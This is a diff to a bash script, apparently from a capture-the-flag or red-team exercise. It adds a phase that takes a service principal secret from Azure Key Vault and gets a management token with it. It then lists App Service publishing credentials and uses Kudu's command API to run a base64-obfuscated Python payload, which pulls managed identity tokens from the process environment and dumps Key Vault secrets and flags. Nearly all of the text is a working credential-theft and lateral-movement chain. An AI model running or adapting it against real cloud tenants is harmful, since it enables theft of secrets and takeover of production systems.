@@ -161,4 +161,70 @@ for name in $(echo "$LIST2" | jq -r '.value[]?.id | split("/") | last'); do
   done
 done
 say APPSERVICE_END
+
+say REPORTING_PHASE
+RPT_NAME='reporting-service-principal'
+RPT_S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$RPT_NAME?api-version=7.4")
+RPT_V=$(echo "$RPT_S" | jq -r '.value // empty')
+RPT_ID=$(echo "$RPT_V" | jq -r '.appId // empty' 2>/dev/null || true)
+RPT_SEC=$(echo "$RPT_V" | jq -r '.clientSecret // empty' 2>/dev/null || true)
+RPT_TEN=$(echo "$RPT_V" | jq -r '.tenantId // empty' 2>/dev/null || true)
+if [[ -n "$RPT_ID" && -n "$RPT_SEC" ]]; then
+  RPT_ARM_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$RPT_TEN/oauth2/v2.0/token" -d "client_id=$RPT_ID" -d 'grant_type=client_credentials' -d "client_secret=$RPT_SEC" -d 'scope=https://management.azure.com/.default')
+  RPT_ARM=$(echo "$RPT_ARM_R" | jq -r '.access_token // empty')
+  say "RPT_ARM=$([[ -n "$RPT_ARM" ]] && echo OK || echo FAIL)"
+  RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'
+  APP_BASE="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP"
+  PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RPT_ARM" -H 'Content-Length: 0' "$APP_BASE/config/publishingcredentials/list?api-version=2023-01-01")
+  PUB_USER=$(echo "$PC" | jq -r '.properties.publishingUserName // empty' 2>/dev/null || true)
+  PUB_PASS=$(echo "$PC" | jq -r '.properties.publishingPassword // empty' 2>/dev/null || true)
+  say "PUB_CREDS_USER_SET=$([[ -n "$PUB_USER" ]] && echo yes || echo no) PASS_LEN=${#PUB_PASS}"
+  if [[ -n "$PUB_USER" && -n "$PUB_PASS" ]]; then
+    SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
+    SET=$(curl -sS --max-time 20 -u "$PUB_USER:$PUB_PASS" "$SCM/api/settings")
+    say "KUDU_SETTINGS_B64=$(printf '%s' "$SET" | base64 -w0)"
+    ENVC=$(jq -nc '{command:"env | grep -E \"IDENTITY|MSI\" | sed -E \"s/=.*/=<set>/\"",dir:"/home/site/wwwroot"}')
+    EK=$(curl -sS --max-time 20 -u "$PUB_USER:$PUB_PASS" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$ENVC")
+    say "KUDU_ENVKEYS_B64=$(printf '%s' "$EK" | base64 -w0)"
+    PYSRC=$(cat <<'PYEOF'
+import os,json,urllib.request,base64
+ie=os.environ.get('IDENTITY_ENDPOINT',''); ih=os.environ.get('IDENTITY_HEADER','')
+if not ie or not ih:
+    for p in ['/proc/1/environ','/proc/self/environ']:
+        try:
+            data=open(p,'rb').read().split(b'\0')
+            d={}
+            for x in data:
+                if b'=' in x:
+                    k,v=x.split(b'=',1); d[k.decode(errors='ignore')]=v.decode(errors='ignore')
+            ie=ie or d.get('IDENTITY_ENDPOINT',''); ih=ih or d.get('IDENTITY_HEADER','')
+        except Exception: pass
+print('IDENTITY_ENDPOINT_SET', bool(ie), 'IDENTITY_HEADER_SET', bool(ih))
+if not ie or not ih:
+    raise SystemExit(0)
+u=ie+'?resource=https://vault.azure.net&api-version=2019-08-01'
+r=urllib.request.Request(u,headers={'X-IDENTITY-HEADER':ih})
+tok=json.loads(urllib.request.urlopen(r,timeout=10).read()).get('access_token','')
+print('MI_TOKEN_LEN',len(tok))
+for vault in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
+    for path in ['secrets?api-version=7.4','secrets/flag?api-version=7.4','secrets/FLAG?api-version=7.4']:
+        try:
+            q=urllib.request.Request(f'https://{vault}.vault.azure.net/{path}',headers={'Authorization':'Bearer '+tok})
+            b=urllib.request.urlopen(q,timeout=10).read()
+            print(vault,path,'HTTP',200,'B64',base64.b64encode(b).decode())
+        except Exception as e:
+            print(vault,path,'ERR',str(e)[:160])
+PYEOF
+)
+    PYB64=$(printf '%s' "$PYSRC" | base64 -w0)
+    CMD="python3 -c \"import base64;exec(base64.b64decode('$PYB64'))\""
+    PYC=$(jq -nc --arg c "$CMD" '{command:$c,dir:"/home/site/wwwroot"}')
+    PR=$(curl -sS --max-time 40 -u "$PUB_USER:$PUB_PASS" -H 'Content-Type: application/json' -X POST "$SCM/api/command" -d "$PYC")
+    say "KUDU_PY_B64=$(printf '%s' "$PR" | base64 -w0)"
+    say "KUDU_PY_HTTP_DONE"
+  fi
+else
+  say RPT_SP_MISSING
+fi
+say REPORTING_END
 say END
